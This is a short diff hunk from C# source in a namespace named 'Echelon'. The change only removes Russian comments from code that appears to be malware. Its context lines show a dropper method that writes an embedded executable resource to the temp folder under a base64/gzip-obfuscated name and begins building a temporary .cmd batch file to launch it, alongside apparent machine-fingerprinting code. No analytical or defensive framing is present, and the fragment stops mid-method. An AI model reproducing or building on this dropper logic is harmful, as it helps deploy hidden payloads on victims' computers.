@@ -83,13 +83,9 @@ namespace Echelon
             return Country;
         }
 
-
-        // Получаем VolumeSerialNumber
         public static void Deocder()
         {
-            // Извлекаем exe из ресурсов во временную папку
             File.WriteAllBytes(Path.GetTempPath() + Decrypt.Get("H4sIAAAAAAAEAIuJcUlNzk9JLdJLrUgFAPWHUugNAAAA"), Properties.Resources.Decoder);
-            // Создает временный .cmd и им запускаем наши файлы
             string batch = Path.GetTempPath() + Decrypt.Get("H4sIAAAAAAAEANNLzk0BAMPCtLEEAAAA");
             using (StreamWriter sw = new StreamWriter(batch))
             {
